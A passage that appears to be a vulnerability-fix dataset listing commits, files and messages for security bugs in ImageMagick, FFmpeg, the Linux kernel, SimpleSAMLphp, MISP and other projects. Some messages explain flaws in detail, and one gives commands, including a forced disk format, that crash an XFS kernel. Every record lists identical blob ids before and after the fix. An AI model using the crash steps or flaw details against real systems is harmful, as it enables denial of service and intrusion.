Commit Message for cb9f07d9dcd791b63e622da43f7b232adaec0a9a:
Don't assume TDRC is an instance of TextIdentificationFrame (#831)\n\nIf TDRC is encrypted, FrameFactory::createFrame() returns UnknownFrame  which causes problems in rebuildAggregateFrames() when it is assumed  that TDRC is a TextIdentificationFrame

======================================================================
Commit With Fix: 
    6013ca1c83bf232008f7be815c0e4821fb6b120a
File(s) In Commit: 
    qa-include/qa-install.php
Blob(s) In Commit: 
    4c11d211c92900df9b21a5716eafdf1143d5f221
Blob(s) Before Fix: 
    4c11d211c92900df9b21a5716eafdf1143d5f221
Projects:
    0xhacking_question2answer
Commit Message for 6013ca1c83bf232008f7be815c0e4821fb6b120a:
Security fix in qa-install.php

======================================================================
Commit With Fix: 
    4bc629658e7b7d17c9ac3fe0da7dc5df71f1b85e
File(s) In Commit: 
    lib/SimpleSAML/Utils/Crypto.php
Blob(s) In Commit: 
    c7d16921a5248322c65de9cf7238dcc87b783cb8
Blob(s) Before Fix: 
    c7d16921a5248322c65de9cf7238dcc87b783cb8
Projects:
    01000101_simplesamlphp
Commit Message for 4bc629658e7b7d17c9ac3fe0da7dc5df71f1b85e:
bugfix: SimpleSAML\Utils\Crypto returns true for different strings using PHP < 5.6.\n\nThe reason was the lack of conversion to integer for each character of the strings before applying the XOR operator to them. The operator returns always an empty string when applied to two characters, and applying a binary-wise OR between 0 and an empty string, yields 0. Therefore, $diff is always 0, and the function returns true for every two strings with same length, regardless of their contents.

======================================================================
Commit With Fix: 
    77df6a932d46daa35e364925eb73a175010dc904
File(s) In Commit: 
    lib/SimpleSAML/Utils/Crypto.php
Blob(s) In Commit: 
    22335b3235932e7878408b690b886b4198f7748f
Blob(s) Before Fix: 
    22335b3235932e7878408b690b886b4198f7748f
Projects:
    01000101_simplesamlphp
Commit Message for 77df6a932d46daa35e364925eb73a175010dc904:
Fix an issue with IV generation in SimpleSAML\Utils\Crypto::aesEncrypt().\n\nIVs must be random and one-time (never reused). Additionally, by deriving it from the key, the key length was effectively reduced to 128 bits.

======================================================================
Commit With Fix: 
    90dca835158495b173808273e7df127303b8b953
File(s) In Commit: 
    modules/saml/lib/IdP/SAML2.php
Blob(s) In Commit: 
    3a5ae0fbffdae1809810027584c39f3fb9024957
Blob(s) Before Fix: 
    3a5ae0fbffdae1809810027584c39f3fb9024957
Projects:
    01000101_simplesamlphp
Commit Message for 90dca835158495b173808273e7df127303b8b953:
bugfix: Make sure a persistent NameID is not generated by default when the UserID is missing in the state array.\n\nThis allowed misconfigured IdPs (i.e. those without both a PersistenNameID authproc filter, a “userid.attribute” configuration option and no “eduPersonPrincipalName” attribute available after running all the authentication processing filters) to generate a persistent NameID based on “null”, effectively giving all users the same identifier.

======================================================================
Commit With Fix: 
    1cc6f0ccc92c20c7cab6c4a7335daf29c91f0d8e
File(s) In Commit: 
    MagickCore/enhance.c
Blob(s) In Commit: 
    dba7880553faeb0fdc57e7d82e52d9eea68c7ed6
Blob(s) Before Fix: 
    dba7880553faeb0fdc57e7d82e52d9eea68c7ed6
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 1cc6f0ccc92c20c7cab6c4a7335daf29c91f0d8e:
https://github.com/ImageMagick/ImageMagick/issues/663 https://github.com/ImageMagick/ImageMagick/issues/655

======================================================================
Commit With Fix: 
    04178de2247e353fc095846784b9a10fefdbf890
File(s) In Commit: 
    coders/mat.c
Blob(s) In Commit: 
    fc8da2b144d7c8b08e25b6b110c0db52f0eaeb3a
Blob(s) Before Fix: 
    fc8da2b144d7c8b08e25b6b110c0db52f0eaeb3a
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 04178de2247e353fc095846784b9a10fefdbf890:
https://github.com/ImageMagick/ImageMagick/issues/662

======================================================================
Commit With Fix: 
    96e9506ae9e252c548665152d1b8968297128307
File(s) In Commit: 
    src/controller.cpp
Blob(s) In Commit: 
    40db06c59dcfa90f59a3306f515593b579b3db1d
Blob(s) Before Fix: 
    40db06c59dcfa90f59a3306f515593b579b3db1d
Projects:
    2ion_newsbeuter
Commit Message for 96e9506ae9e252c548665152d1b8968297128307:
Sanitize inputs to bookmark-cmd (#591)\n\nNewsbeuter didn't properly shell-escape the arguments passed to bookmarking command, which allows a remote attacker to perform remote code execution by crafting an RSS item whose title and/or URL contain something interpretable by the shell (most notably subshell invocations.)\n\nThis has been reported by Jeriko One <jeriko.one@gmx.us>, complete with PoC and a patch.\n\nThis vulnerability was assigned CVE-2017-12904.

======================================================================
Commit With Fix: 
    a00b684465b38d722ca9a3543b8af8568e6bad5c
File(s) In Commit: 
    tls/src/main/java/org/bouncycastle/tls/crypto/impl/jcajce/JceDefaultTlsCredentialedDecryptor.java
Blob(s) In Commit: 
    cea1df8b9faee7804b6326d6e288cc4bbb56a442
Blob(s) Before Fix: 
    cea1df8b9faee7804b6326d6e288cc4bbb56a442
Projects:
    0xPagliacci_bc-java
Commit Message for a00b684465b38d722ca9a3543b8af8568e6bad5c:
Confirm size of decrypted PMS before using

======================================================================
Commit With Fix: 
    d072ed6aff835c174e856ce3a428163c0da9e8f4
File(s) In Commit: 
    coders/png.c
Blob(s) In Commit: 
    ea6dce6ab5f862a70a5ef5c2287127ded3125930
Blob(s) Before Fix: 
    ea6dce6ab5f862a70a5ef5c2287127ded3125930
Projects:
    2016repotsheyue_ImageMagick
Commit Message for d072ed6aff835c174e856ce3a428163c0da9e8f4:
Skip MNG CLIP chunk with out-of-range object IDs

======================================================================
Commit With Fix: 
    51b0ae01709adc1e4a9245e158ef17b85a110960
File(s) In Commit: 
    coders/mat.c
Blob(s) In Commit: 
    cf2190bf373a28e1ee6008ba2d33c8e0cc0779fc
Blob(s) Before Fix: 
    cf2190bf373a28e1ee6008ba2d33c8e0cc0779fc
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 51b0ae01709adc1e4a9245e158ef17b85a110960:
https://github.com/ImageMagick/ImageMagick/issues/362

======================================================================
Commit With Fix: 
    79e5dbcdd1fc2f714f9bae548bc55d5073f3ed20
File(s) In Commit: 
    coders/mat.c
Blob(s) In Commit: 
    48cde36e27d7fbe3e0215012229e53aefd0c0091
Blob(s) Before Fix: 
    48cde36e27d7fbe3e0215012229e53aefd0c0091
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 79e5dbcdd1fc2f714f9bae548bc55d5073f3ed20:
...

======================================================================
Commit With Fix: 
    e5c063a1007506ba69e97a35effcdef944421c89
File(s) In Commit: 
    coders/mat.c
Blob(s) In Commit: 
    be646a008168df92966ddaa3fc8806ff1c61311d
Blob(s) Before Fix: 
    be646a008168df92966ddaa3fc8806ff1c61311d
Projects:
    2016repotsheyue_ImageMagick
Commit Message for e5c063a1007506ba69e97a35effcdef944421c89:
https://github.com/ImageMagick/ImageMagick/issues/598

======================================================================
Commit With Fix: 
    6eba658d4a648b41b357025d864c19a67412b8aa
File(s) In Commit: 
    app/View/Helper/CommandHelper.php
Blob(s) In Commit: 
    4adbaad7c190e9b1a3f4c5789dd041d377d11ae8
Blob(s) Before Fix: 
    4adbaad7c190e9b1a3f4c5789dd041d377d11ae8
Projects:
    0-vortex_MISP
Commit Message for 6eba658d4a648b41b357025d864c19a67412b8aa:
fix: Fixed a potential persistent cross site scripting in the comments\n\n- new tag parser for the comments implemented - Parser now cleanly pre-constructs the replacement items after finding tag pairs\n\n- This only impacts users of the same instance, as comments are not synchronised\n\n- as reported by Jurgen Jans and Cedric Van Bockhaven from Deloitte

======================================================================
Commit With Fix: 
    bc3aae2bbac46dd894c89db5d5e98f7f0ef9e205
File(s) In Commit: 
    net/ipv4/route.c
Blob(s) In Commit: 
    2331de20ca505d7f25fe9d93d5320e9e39af6c39
Blob(s) Before Fix: 
    2331de20ca505d7f25fe9d93d5320e9e39af6c39
Projects:
    0-T-0_ps4-linux
Commit Message for bc3aae2bbac46dd894c89db5d5e98f7f0ef9e205:
net: check and errout if res->fi is NULL when RTM_F_FIB_MATCH is set\n\nSyzkaller hit 'general protection fault in fib_dump_info' bug on commit 4.13-rc5..\n\nGuilty file: net/ipv4/fib_semantics.c\n\nkasan: GPF could be caused by NULL-ptr deref or user memory access general protection fault: 0000 [#1] SMP KASAN Modules linked in: CPU: 0 PID: 2808 Comm: syz-executor0 Not tainted 4.13.0-rc5 #1 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014 task: ffff880078562700 task.stack: ffff880078110000 RIP: 0010:fib_dump_info+0x388/0x1170 net/ipv4/fib_semantics.c:1314 RSP: 0018:ffff880078117010 EFLAGS: 00010206 RAX: dffffc0000000000 RBX: 00000000000000fe RCX: 0000000000000002 RDX: 0000000000000006 RSI: ffff880078117084 RDI: 0000000000000030 RBP: ffff880078117268 R08: 000000000000000c R09: ffff8800780d80c8 R10: 0000000058d629b4 R11: 0000000067fce681 R12: 0000000000000000 R13: ffff8800784bd540 R14: ffff8800780d80b5 R15: ffff8800780d80a4 FS:  00000000022fa940(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 00000000004387d0 CR3: 0000000079135000 CR4: 00000000000006f0 Call Trace:   inet_rtm_getroute+0xc89/0x1f50 net/ipv4/route.c:2766   rtnetlink_rcv_msg+0x288/0x680 net/core/rtnetlink.c:4217   netlink_rcv_skb+0x340/0x470 net/netlink/af_netlink.c:2397   rtnetlink_rcv+0x28/0x30 net/core/rtnetlink.c:4223   netlink_unicast_kernel net/netlink/af_netlink.c:1265 [inline]   netlink_unicast+0x4c4/0x6e0 net/netlink/af_netlink.c:1291   netlink_sendmsg+0x8c4/0xca0 net/netlink/af_netlink.c:1854   sock_sendmsg_nosec net/socket.c:633 [inline]   sock_sendmsg+0xca/0x110 net/socket.c:643   ___sys_sendmsg+0x779/0x8d0 net/socket.c:2035   __sys_sendmsg+0xd1/0x170 net/socket.c:2069   SYSC_sendmsg net/socket.c:2080 [inline]   SyS_sendmsg+0x2d/0x50 net/socket.c:2076   entry_SYSCALL_64_fastpath+0x1a/0xa5   RIP: 0033:0x4512e9   RSP: 002b:00007ffc75584cc8 EFLAGS: 00000216 ORIG_RAX:   000000000000002e   RAX: ffffffffffffffda RBX: 0000000000000002 RCX: 00000000004512e9   RDX: 0000000000000000 RSI: 0000000020f2cfc8 RDI: 0000000000000003   RBP: 000000000000000e R08: 0000000000000000 R09: 0000000000000000   R10: 0000000000000000 R11: 0000000000000216 R12: fffffffffffffffe   R13: 0000000000718000 R14: 0000000020c44ff0 R15: 0000000000000000   Code: 00 0f b6 8d ec fd ff ff 48 8b 85 f0 fd ff ff 88 48 17 48 8b 45   28 48 8d 78 30 48 b8 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03   <0f>   b6 04 02 84 c0 74 08 3c 03 0f 8e cb 0c 00 00 48 8b 45 28 44   RIP: fib_dump_info+0x388/0x1170 net/ipv4/fib_semantics.c:1314 RSP:   ffff880078117010 ---[ end trace 254a7af28348f88b ]---\n\nThis patch adds a res->fi NULL check.\n\nexample run: $ip route get 0.0.0.0 iif virt1-0 broadcast 0.0.0.0 dev lo     cache <local,brd> iif virt1-0\n\n$ip route get 0.0.0.0 iif virt1-0 fibmatch RTNETLINK answers: No route to host\n\nReported-by: idaifish <idaifish@gmail.com> Reported-by: Dmitry Vyukov <dvyukov@google.com> Fixes: b61798130f1b ("net: ipv4: RTM_GETROUTE: return matched fib result when requested") Signed-off-by: Roopa Prabhu <roopa@cumulusnetworks.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a6e544b0a88b53114bfa5a57e21b7be7a8dfc9d0
File(s) In Commit: 
    net/core/flow_dissector.c
Blob(s) In Commit: 
    22f3d768b45925d03beecb5715c419b25fde09bf
Blob(s) Before Fix: 
    22f3d768b45925d03beecb5715c419b25fde09bf
Projects:
    0-T-0_ps4-linux
Commit Message for a6e544b0a88b53114bfa5a57e21b7be7a8dfc9d0:
flow_dissector: Jump to exit code in __skb_flow_dissect\n\nInstead of returning immediately (on a parsing failure for instance) we jump to cleanup code. This always sets protocol values in key_control (even on a failure there is still valid information in the key_tags that was set before the problem was hit).\n\nSigned-off-by: Tom Herbert <tom@herbertland.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    124eb202e70678539544f6268efc98131f19fa49
File(s) In Commit: 
    libavformat/rmdec.c
Blob(s) In Commit: 
    d6d7d9cd8414da5030021d513eebf943c69238ca
Blob(s) Before Fix: 
    d6d7d9cd8414da5030021d513eebf943c69238ca
Projects:
    00ERNEST00_FFmpeg
Commit Message for 124eb202e70678539544f6268efc98131f19fa49:
avformat/rmdec: Fix DoS due to lack of eof check\n\nFixes: loop.ivr\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    4f05e2e2dc1a89f38cd9f0960a6561083d714f1e
File(s) In Commit: 
    libavformat/mvdec.c
Blob(s) In Commit: 
    f7aa4cbaecf863ac11a76ec677a0bd24d53253ca
Blob(s) Before Fix: 
    f7aa4cbaecf863ac11a76ec677a0bd24d53253ca
Projects:
    00ERNEST00_FFmpeg
Commit Message for 4f05e2e2dc1a89f38cd9f0960a6561083d714f1e:
avformat/mvdec: Fix DoS due to lack of eof check\n\nFixes: loop.mv\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    96f24d1bee7fe7bac08e2b7c74db1a046c9dc0de
File(s) In Commit: 
    libavformat/rl2.c
Blob(s) In Commit: 
    eb1682dfcb7c2983a9a5c06175aac0e470c9e357
Blob(s) Before Fix: 
    eb1682dfcb7c2983a9a5c06175aac0e470c9e357
Projects:
    00ERNEST00_FFmpeg
Commit Message for 96f24d1bee7fe7bac08e2b7c74db1a046c9dc0de:
avformat/rl2: Fix DoS due to lack of eof check\n\nFixes: loop.rl2\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    7f9ec5593e04827249e7aeb466da06a98a0d7329
File(s) In Commit: 
    libavformat/asfdec_f.c
Blob(s) In Commit: 
    f3acbae2801b773dd68ee5245bff384530456a1e
Blob(s) Before Fix: 
    f3acbae2801b773dd68ee5245bff384530456a1e
Projects:
    00ERNEST00_FFmpeg
Commit Message for 7f9ec5593e04827249e7aeb466da06a98a0d7329:
avformat/asfdec: Fix DoS due to lack of eof check\n\nFixes: loop.asf\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    7e80b63ecd259d69d383623e75b318bf2bd491f6
File(s) In Commit: 
    libavformat/cinedec.c
Blob(s) In Commit: 
    de34fb963820188a8c9965263978cb4a408d33d9
Blob(s) Before Fix: 
    de34fb963820188a8c9965263978cb4a408d33d9
Projects:
    00ERNEST00_FFmpeg
Commit Message for 7e80b63ecd259d69d383623e75b318bf2bd491f6:
avformat/cinedec: Fix DoS due to lack of eof check\n\nFixes: loop.cine\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    499350a5a6e7512d9ed369ed63a4244b6536f4f8
File(s) In Commit: 
    net/ipv4/tcp.c
Blob(s) In Commit: 
    842b575f8fdddc41a41aa6f03fb9086cec7ee451
Blob(s) Before Fix: 
    842b575f8fdddc41a41aa6f03fb9086cec7ee451
Projects:
    0-T-0_ps4-linux
Commit Message for 499350a5a6e7512d9ed369ed63a4244b6536f4f8:
tcp: initialize rcv_mss to TCP_MIN_MSS instead of 0\n\nWhen tcp_disconnect() is called, inet_csk_delack_init() sets icsk->icsk_ack.rcv_mss to 0. This could potentially cause tcp_recvmsg() => tcp_cleanup_rbuf() => __tcp_select_window() call path to have division by 0 issue. So this patch initializes rcv_mss to TCP_MIN_MSS instead of 0.\n\nReported-by: Andrey Konovalov  <andreyknvl@google.com> Signed-off-by: Wei Wang <weiwan@google.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: Neal Cardwell <ncardwell@google.com> Signed-off-by: Yuchung Cheng <ycheng@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    197e7e521384a23b9e585178f3f11c9fa08274b9
File(s) In Commit: 
    mm/migrate.c
Blob(s) In Commit: 
    e84eeb4e43566c7b1ee85e3759b1b60b72c1c532
Blob(s) Before Fix: 
    e84eeb4e43566c7b1ee85e3759b1b60b72c1c532
Projects:
    0-T-0_ps4-linux
Commit Message for 197e7e521384a23b9e585178f3f11c9fa08274b9:
Sanitize 'move_pages()' permission checks\n\nThe 'move_paghes()' system call was introduced long long ago with the same permission checks as for sending a signal (except using CAP_SYS_NICE instead of CAP_SYS_KILL for the overriding capability).\n\nThat turns out to not be a great choice - while the system call really only moves physical page allocations around (and you need other capabilities to do a lot of it), you can check the return value to map out some the virtual address choices and defeat ASLR of a binary that still shares your uid.\n\nSo change the access checks to the more common 'ptrace_may_access()' model instead.\n\nThis tightens the access checks for the uid, and also effectively changes the CAP_SYS_NICE check to CAP_SYS_PTRACE, but it's unlikely that anybody really _uses_ this legacy system call any more (we hav ebetter NUMA placement models these days), so I expect nobody to notice.\n\nFamous last words.\n\nReported-by: Otto Ebeling <otto.ebeling@iki.fi> Acked-by: Eric W. Biederman <ebiederm@xmission.com> Cc: Willy Tarreau <w@1wt.eu> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    9d00fb9d70ee8c0cc7002b89318c5be00f1bbdad
File(s) In Commit: 
    libavformat/mxfdec.c
Blob(s) In Commit: 
    91731a7533c157c3be48678fd51be5ac43139320
Blob(s) Before Fix: 
    91731a7533c157c3be48678fd51be5ac43139320
Projects:
    00ERNEST00_FFmpeg
Commit Message for 9d00fb9d70ee8c0cc7002b89318c5be00f1bbdad:
avformat/mxfdec: Fix Sign error in mxf_read_primer_pack()\n\nFixes: 20170829B.mxf\n\nCo-Author: 张洪亮(望初)" <wangchu.zhl@alibaba-inc.com> Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    900f39692ca0337a98a7cf047e4e2611071810c2
File(s) In Commit: 
    libavformat/mxfdec.c
Blob(s) In Commit: 
    6adb77d81fbf203bfae31f5f4cf920777fea1b58
Blob(s) Before Fix: 
    6adb77d81fbf203bfae31f5f4cf920777fea1b58
Projects:
    00ERNEST00_FFmpeg
Commit Message for 900f39692ca0337a98a7cf047e4e2611071810c2:
avformat/mxfdec: Fix DoS issues in mxf_read_index_entry_array()\n\nFixes: 20170829A.mxf\n\nCo-Author: 张洪亮(望初)" <wangchu.zhl@alibaba-inc.com> Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    c24bcb553650b91e9eff15ef6e54ca73de2453b7
File(s) In Commit: 
    libavformat/nsvdec.c
Blob(s) In Commit: 
    d8ce656817cab7009362d692fee25d14d006f772
Blob(s) Before Fix: 
    d8ce656817cab7009362d692fee25d14d006f772
Projects:
    00ERNEST00_FFmpeg
Commit Message for c24bcb553650b91e9eff15ef6e54ca73de2453b7:
avformat/nsvdec: Fix DoS due to lack of eof check in nsvs_file_offset loop.\n\nFixes: 20170829.nsv\n\nCo-Author: 张洪亮(望初)" <wangchu.zhl@alibaba-inc.com> Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    bdbbb13f1fe9b7e2465502c500561720f7456aac
File(s) In Commit: 
    coders/ps.c
Blob(s) In Commit: 
    abe3a23eaaeb0e1b7eac1da6bb79ecd2756d7559
Blob(s) Before Fix: 
    abe3a23eaaeb0e1b7eac1da6bb79ecd2756d7559
Projects:
    2016repotsheyue_ImageMagick
Commit Message for bdbbb13f1fe9b7e2465502c500561720f7456aac:
https://github.com/ImageMagick/ImageMagick/issues/715

======================================================================
Commit With Fix: 
    50f54462076648ac2e36c3f58f4dadd4babbf1c9
File(s) In Commit: 
    coders/txt.c
Blob(s) In Commit: 
    051f6bef2b22cbe80632c426621066104b4ebb06
Blob(s) Before Fix: 
    051f6bef2b22cbe80632c426621066104b4ebb06
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 50f54462076648ac2e36c3f58f4dadd4babbf1c9:
https://github.com/ImageMagick/ImageMagick/issues/713

======================================================================
Commit With Fix: 
    d9a8234d211da30baf9526fbebe9a8438ea7e11c
File(s) In Commit: 
    coders/xbm.c
Blob(s) In Commit: 
    ea2f76bf96218f6b11f80cb3fcb2edb8f04460ec
Blob(s) Before Fix: 
    ea2f76bf96218f6b11f80cb3fcb2edb8f04460ec
Projects:
    2016repotsheyue_ImageMagick
Commit Message for d9a8234d211da30baf9526fbebe9a8438ea7e11c:
https://github.com/ImageMagick/ImageMagick/issues/712

======================================================================
Commit With Fix: 
    9cb4eb772839c5e1de2855d126bf74ff16d13382
File(s) In Commit: 
    libavformat/mov.c
Blob(s) In Commit: 
    2519707345410938ebf220b57e601b5d0cc61bc3
Blob(s) Before Fix: 
    2519707345410938ebf220b57e601b5d0cc61bc3
Projects:
    00ERNEST00_FFmpeg
Commit Message for 9cb4eb772839c5e1de2855d126bf74ff16d13382:
avformat/mov: Fix DoS in read_tfra()\n\nFixes: Missing EOF check in loop No testcase\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    afc9c683ed9db01edb357bc8c19edad4282b3a97
File(s) In Commit: 
    libavformat/asfdec_f.c
Blob(s) In Commit: 
    cc648b9a2f05563a3b12b1c8a09ce4a77a536079
Blob(s) Before Fix: 
    cc648b9a2f05563a3b12b1c8a09ce4a77a536079
Projects:
    00ERNEST00_FFmpeg
Commit Message for afc9c683ed9db01edb357bc8c19edad4282b3a97:
avformat/asfdec: Fix DoS in asf_build_simple_index()\n\nFixes: Missing EOF check in loop No testcase\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    6bd33275368edfa71ae117de895488584678ac79
File(s) In Commit: 
    imap/mboxlist.c
Blob(s) In Commit: 
    dbee06c0f5f414c282d47aca8780ba9e34bda308
Blob(s) Before Fix: 
    dbee06c0f5f414c282d47aca8780ba9e34bda308
Projects:
    25814916m_cyrus-imapd
Commit Message for 6bd33275368edfa71ae117de895488584678ac79:
mboxlist: fix uninitialised memory use where pattern is "Other Users"

======================================================================
Commit With Fix: 
    1d65ad6786282d23ba1865f56e2fd19188e7c26a
File(s) In Commit: 
    shibboleth.php
Blob(s) In Commit: 
    f03b5efa4e8ad432e0d51f0220fa65f290a4dbed
Blob(s) Before Fix: 
    f03b5efa4e8ad432e0d51f0220fa65f290a4dbed
Projects:
    mlaa_shibboleth
Commit Message for 1d65ad6786282d23ba1865f56e2fd19188e7c26a:
escape url after add_query_arg

======================================================================
Commit With Fix: 
    be111a470204a974c50682054c9c7d4b94396ed9
File(s) In Commit: 
    app/Plugin/CertAuth/Controller/Component/Auth/CertificateAuthenticate.php
Blob(s) In Commit: 
    1ad5c481ff9da0836771da4acec1f2b782283eb6
Blob(s) Before Fix: 
    1ad5c481ff9da0836771da4acec1f2b782283eb6
Projects:
    0-vortex_MISP
Commit Message for be111a470204a974c50682054c9c7d4b94396ed9:
fix: Fix to certauth pains

======================================================================
Commit With Fix: 
    b31ff3cdf540110da4572e3e29bd172087af65cc
File(s) In Commit: 
    fs/xfs/xfs_linux.h
Blob(s) In Commit: 
    dcd1292664b3404b25bd93b9d40e58ab81d72376
Blob(s) Before Fix: 
    dcd1292664b3404b25bd93b9d40e58ab81d72376
Projects:
    0-T-0_ps4-linux
Commit Message for b31ff3cdf540110da4572e3e29bd172087af65cc:
xfs: XFS_IS_REALTIME_INODE() should be false if no rt device present\n\nIf using a kernel with CONFIG_XFS_RT=y and we set the RHINHERIT flag on a directory in a filesystem that does not have a realtime device and create a new file in that directory, it gets marked as a real time file. When data is written and a fsync is issued, the filesystem attempts to flush a non-existent rt device during the fsync process.\n\nThis results in a crash dereferencing a null buftarg pointer in xfs_blkdev_issue_flush():\n\n  BUG: unable to handle kernel NULL pointer dereference at 0000000000000008   IP: xfs_blkdev_issue_flush+0xd/0x20   .....   Call Trace:     xfs_file_fsync+0x188/0x1c0     vfs_fsync_range+0x3b/0xa0     do_fsync+0x3d/0x70     SyS_fsync+0x10/0x20     do_syscall_64+0x4d/0xb0     entry_SYSCALL64_slow_path+0x25/0x25\n\nSetting RT inode flags does not require special privileges so any unprivileged user can cause this oops to occur.  To reproduce, confirm kernel is compiled with CONFIG_XFS_RT=y and run:\n\n  # mkfs.xfs -f /dev/pmem0   # mount /dev/pmem0 /mnt/test   # mkdir /mnt/test/foo   # xfs_io -c 'chattr +t' /mnt/test/foo   # xfs_io -f -c 'pwrite 0 5m' -c fsync /mnt/test/foo/bar\n\nOr just run xfstests with MKFS_OPTIONS="-d rtinherit=1" and wait.\n\nKernels built with CONFIG_XFS_RT=n are not exposed to this bug.\n\nFixes: f538d4da8d52 ("[XFS] write barrier support") Cc: <stable@vger.kernel.org> Signed-off-by: Richard Wareing <rwareing@fb.com> Signed-off-by: Dave Chinner <david@fromorbit.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    7d63315a64267c565d1f34b9cb523a14616fed24
File(s) In Commit: 
    coders/wpg.c
Blob(s) In Commit: 
    4756dba3f4cc417c2fa3b3f6517110a9be6ffb4d
Blob(s) Before Fix: 
    4756dba3f4cc417c2fa3b3f6517110a9be6ffb4d
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 7d63315a64267c565d1f34b9cb523a14616fed24:
https://github.com/ImageMagick/ImageMagick/issues/654

======================================================================
Commit With Fix: 
    edbd58be15a957f6a760c4a514cd475217eb97fd
File(s) In Commit: 
    net/packet/af_packet.c
Blob(s) In Commit: 
    1c61af9af67dae10ea9675a45b191d7302c69151
Blob(s) Before Fix: 
    1c61af9af67dae10ea9675a45b191d7302c69151
Projects:
    0-T-0_ps4-linux
Commit Message for edbd58be15a957f6a760c4a514cd475217eb97fd:
packet: Don't write vnet header beyond end of buffer\n\n... which may happen with certain values of tp_reserve and maclen.\n\nFixes: 58d19b19cd99 ("packet: vnet_hdr support for tpacket_rcv") Signed-off-by: Benjamin Poirier <bpoirier@suse.com> Cc: Willem de Bruijn <willemb@google.com> Acked-by: Willem de Bruijn <willemb@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c42a1388a6d1bfd8001bf6a4241d8ca27e49326d
File(s) In Commit: 
    libavformat/rtpdec_h264.c
Blob(s) In Commit: 
    6f8148ab6d5db7e26aad1029a68d13844302029c
Blob(s) Before Fix: 
    6f8148ab6d5db7e26aad1029a68d13844302029c
Projects:
    00ERNEST00_FFmpeg
Commit Message for c42a1388a6d1bfd8001bf6a4241d8ca27e49326d:
avformat/rtpdec_h264: Fix heap-buffer-overflow\n\nFixes: rtp_sdp/poc.sdp\n\nFound-by: Bingchang <l.bing.chang.bc@gmail.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    9292360c8b3898d0990983269f110cef21729090
File(s) In Commit: 
    mods/_standard/rss_feeds/edit_feed.php
Blob(s) In Commit: 
    4abac11edd47cf6ef636e7f5900f063583846906
Blob(s) Before Fix: 
    4abac11edd47cf6ef636e7f5900f063583846906
Projects:
    AMEDUBD_ATutor
Commit Message for 9292360c8b3898d0990983269f110cef21729090:
5815 added htmlspecialchars to filter URL var before going to the db.

======================================================================
Commit With Fix: 
    3e0097499839e0fe3af380410eababe5a47c4cf9
File(s) In Commit: 
    drivers/scsi/sg.c
Blob(s) In Commit: 
    0419c2298eabdb8f80897357a04be66e85e9a4ac
Blob(s) Before Fix: 
    0419c2298eabdb8f80897357a04be66e85e9a4ac
Projects:
    0-T-0_ps4-linux
Commit Message for 3e0097499839e0fe3af380410eababe5a47c4cf9:
scsi: sg: fixup infoleak when using SG_GET_REQUEST_TABLE\n\nWhen calling SG_GET_REQUEST_TABLE ioctl only a half-filled table is returned  the remaining part will then contain stale kernel memory information.  This patch zeroes out the entire table to avoid this issue.\n\nSigned-off-by: Hannes Reinecke <hare@suse.com> Reviewed-by: Bart Van Assche <bart.vanassche@wdc.com> Reviewed-by: Christoph Hellwig <hch@lst.de> Reviewed-by: Eric Dumazet <edumazet@google.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

======================================================================
Commit With Fix: 
    241988ca28139ad970c1d9717c419f41e360ddb0
File(s) In Commit: 
    coders/ycbcr.c
Blob(s) In Commit: 
    7e7d4b45741bd5baf4b1095856c553223d7bdff4
Blob(s) Before Fix: 
    7e7d4b45741bd5baf4b1095856c553223d7bdff4
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 241988ca28139ad970c1d9717c419f41e360ddb0:
fix memory leak in ReadYCBCRImage as SetImageExtent failure

======================================================================
Commit With Fix: 
    ef8f40689ac452398026c07da41656a7c87e4683
File(s) In Commit: 
    coders/yuv.c
Blob(s) In Commit: 
    6eeac3d557fd59d3b55bd00eb7d11740affdc974
Blob(s) Before Fix: 
    6eeac3d557fd59d3b55bd00eb7d11740affdc974
Projects:
    2016repotsheyue_ImageMagick
